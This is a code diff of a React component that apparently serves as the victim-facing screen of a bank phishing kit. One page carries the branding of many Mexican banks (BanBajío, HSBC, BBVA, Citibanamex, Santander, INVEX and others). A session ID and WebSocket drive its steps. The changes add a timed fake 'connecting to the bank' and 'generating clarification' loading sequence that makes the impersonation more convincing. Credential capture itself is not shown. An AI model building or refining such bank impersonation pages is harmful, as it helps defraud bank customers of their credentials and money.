@@ -29,7 +29,7 @@ export default function ClientScreen() {
   const sessionId = params?.sessionId || '';
   
   // State for the current screen
-  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.FOLIO);
+  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.VALIDANDO);
   const [sessionData, setSessionData] = useState<Partial<Session> & { banco: string }>({ banco: 'LIVERPOOL' });
   
   // Additional screen-specific state
@@ -43,9 +43,35 @@ export default function ClientScreen() {
     mensaje?: string;
   }>({});
   
+  // Estado para controlar los mensajes iniciales
+  const [initialMessage, setInitialMessage] = useState<string>('Conectando con el banco...');
+  const [showInitialMessage, setShowInitialMessage] = useState<boolean>(true);
+  
   // WebSocket connection
   const { socket, connected, sendMessage } = useWebSocket('/ws');
 
+  // Efecto para mostrar los mensajes iniciales
+  useEffect(() => {
+    // Mostrar "Conectando con el banco" por 2 segundos
+    const connectingTimer = setTimeout(() => {
+      setInitialMessage('Generando aclaración...');
+      
+      // Después de 2 segundos más, mostrar la pantalla regular
+      const generatingTimer = setTimeout(() => {
+        setShowInitialMessage(false);
+        
+        // Cambiar a la pantalla FOLIO si no hay una pantalla específica configurada
+        if (currentScreen === ScreenType.VALIDANDO && !sessionData.pasoActual) {
+          setCurrentScreen(ScreenType.FOLIO);
+        }
+      }, 2000);
+      
+      return () => clearTimeout(generatingTimer);
+    }, 2000);
+    
+    return () => clearTimeout(connectingTimer);
+  }, []);
+  
   // Register with the server when connection is established
   useEffect(() => {
     if (connected && sessionId) {
@@ -223,7 +249,7 @@ export default function ClientScreen() {
           <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={invexLogoWhite} 
-            className="h-28 inline-block white-logo" 
+            className="h-14 inline-block white-logo" 
             alt="INVEX" 
           />
         </header>
@@ -426,6 +452,51 @@ export default function ClientScreen() {
     }
   };
 
+  // Si estamos mostrando el mensaje inicial, mostrar una pantalla de carga
+  if (showInitialMessage) {
+    return (
+      <div 
+        className={`min-h-screen flex flex-col ${
+          sessionData.banco === 'BANBAJIO' 
+            ? 'banbajio-background'  
+            : 'bg-white'
+        }`}
+        style={
+          sessionData.banco === 'BANBAJIO' 
+            ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } 
+            : sessionData.banco === 'HSBC'
+            ? { backgroundImage: `url(${hsbcBackground})`, backgroundSize: 'cover' } 
+            : {}
+        }
+      >
+        {renderHeader()}
+        
+        <div className="container mx-auto max-w-md px-6 py-8 flex-grow flex flex-col items-center justify-center">
+          <div className="text-center mb-4">
+            <h2 className="text-xl font-semibold mb-4">{initialMessage}</h2>
+            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
+              <div className={`h-full ${
+                sessionData.banco === 'BANBAJIO' ? 'banbajio-bg' : 
+                sessionData.banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
+                sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
+                sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
+                sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
+                sessionData.banco === 'AMEX' ? 'amex-bg' :
+                sessionData.banco === 'SANTANDER' ? 'santander-bg' :
+                sessionData.banco === 'SCOTIABANK' ? 'scotiabank-bg' :
+                sessionData.banco === 'INVEX' ? 'invex-bg' :
+                'bg-[#EC1C24]'
+              } animate-progress-bar`}></div>
+            </div>
+          </div>
+        </div>
+        
+        {renderFooter()}
+      </div>
+    );
+  }
+
+  // Renderizado normal cuando no estamos mostrando el mensaje inicial
   return (
     <div 
       className={`min-h-screen flex flex-col ${
